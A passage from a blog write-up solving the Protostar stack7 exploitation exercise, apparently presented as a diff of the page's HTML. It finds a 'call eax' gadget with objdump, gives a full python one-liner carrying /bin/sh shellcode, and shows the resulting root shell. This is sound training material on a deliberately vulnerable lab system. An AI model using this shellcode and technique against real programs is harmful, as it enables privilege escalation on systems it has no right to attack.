+<p>Code is very similar but this time we are asked to use <strong>ret2text</strong>. That basically means to reuse the hex bytes stored in <strong>.text</strong> as opcodes. We can search the .text section for useful gadgets like <strong>jmp esp</strong> that will allow us to ret to those opcodes and then jump back to <strong>esp</strong> successfully bypassing the program control (0xbf000000).</p>
+
+<pre><code class="language-lang-clike">user@protostar:~$ objdump -M intel -d /opt/protostar/bin/stack7 | grep &quot;call.*esp&quot;
+user@protostar:~$ objdump -M intel -d /opt/protostar/bin/stack7 | grep &quot;jmp.*esp&quot;
+</code></pre>
+
+<p>No luck :( We can also use <strong>ret</strong> or <strong>pop, ret</strong> to jump to the stack section above the overwritten EIP address. But if we look at the code we can see that the only difference from <strong>stack6</strong> is that now the <strong>getpath()</strong> function returns <strong>strdup(buffer)</strong> that means that is going to duplicate whatever string it finds at <strong>&amp;buffer</strong> and return the address for that new string. Functions normally return its output using the <strong>eax</strong> registry. So we can place our shellcode at <strong>buffer</strong> and then overwrite the <strong>ret</strong> address with the address of *<strong>call eax</strong> opcodes in <strong>.text</strong>. That way, we will jump to eax where our shellcode will be waiting for us. The only limitation is that our shellcode needs to be smaller than 80 bytes where we need to place the address to <strong>call eax</strong>:</p>
+
+<pre><code class="language-lang-clike">user@protostar:~$ objdump -M intel -d /opt/protostar/bin/stack7 | grep &quot;call.*eax&quot;
+ 8048478:	ff 14 85 5c 96 04 08 	call   DWORD PTR [eax*4+0x804965c]
+ 80484bf:	ff d0                	call   eax
+ 80485eb:	ff d0                	call   eax
+</code></pre>
+
+<p>We will be using a <a href="http://www.exploit-db.com/exploits/13357">shellcode</a> that returns from stdin in <strong>gets()</strong> and executes <strong>/bin/sh</strong>
+As the return address we will be using the <strong>cal eax</strong> at: 0x080484bf</p>
+
+<pre><code class="language-lang-bash">user@protostar:~$ echo `python -c 'print(&quot;\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80&quot; + &quot;\x90&quot;*25 + &quot;\xbf\x84\x04\x08&quot;)'` | /opt/protostar/bin/stack7
+input path please: got path 1�1۰̀Sh/ttyh/dev��1�f�'�1�Ph//shh/bin��PS�ᙰ
+                                                                       ̀������������������������
+# id
+uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
+#
+</code></pre>
+</article>
+    <footer class="post-footer">
+      
+      <ul class="post-tags">
+        
+          <li><a href="/tags/protostar"><span class="tag">Protostar</span></a></li>
+        
+          <li><a href="/tags/stack0"><span class="tag">Stack0</span></a></li>
+        
+          <li><a href="/tags/stack1"><span class="tag">Stack1</span></a></li>
+        
+          <li><a href="/tags/stack2"><span class="tag">Stack2</span></a></li>
+        
+          <li><a href="/tags/stack4"><span class="tag">Stack4</span></a></li>
+        
+          <li><a href="/tags/stack5"><span class="tag">Stack5</span></a></li>
+        
+          <li><a href="/tags/stack6"><span class="tag">Stack6</span></a></li>
+        
+          <li><a href="/tags/stack7"><span class="tag">Stack7</span></a></li>
+        
+          <li><a href="/tags/stack3"><span class="tag">Stack3</span></a></li>
+        
+      </ul>
+      
+      <p class="post-copyright">
+        This post was published <strong>2136</strong> days ago, content in the post may be inaccurate, even wrong now, please take risk yourself.
+      </p>
+    </footer>
+    
+      
+    
+  </section>
+  
+<footer class="site-footer">
+  <p>© 2017-2019 &lt;/pwntester&gt;</p>
+  <p>Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> with theme <a href="https://github.com/laozhu/hugo-nuo" target="_blank" rel="noopener">Nuo</a>.</p>
+  
+</footer>
+
+
+<script src="https://cdn.jsdelivr.net/npm/smooth-scroll@15.0.0/dist/smooth-scroll.min.js"></script>
+
+
+
+<script async src="https://cdn.jsdelivr.net/npm/video.js@7.3.0/dist/video.min.js"></script>
+
+
+
+
+<script async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      displayMath: [['$$','$$'], ['\\[','\\]']],
+      processEscapes: true,
+      processEnvironments: true,
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+      TeX: { equationNumbers: { autoNumber: "AMS" },
+      extensions: ["AMSmath.js", "AMSsymbols.js"] }
+    },
+  });
+</script>
+<script type="text/x-mathjax-config">
+  // Fix <code> tags after MathJax finishes running. This is a
+  // hack to overcome a shortcoming of Markdown. Discussion at
+  // https://github.com/mojombo/jekyll/issues/199
+  MathJax.Hub.Queue(() => {
+    MathJax.Hub.getAllJax().map(v => v.SourceElement().parentNode.className += ' has-jax');
+  });
+</script>
+
+
+
+<script src="/scripts/index.min.js"></script>
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.register('\/service-worker.js').then(function() {
+      console.log('[ServiceWorker] Registered');
+    });
+  }
+</script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
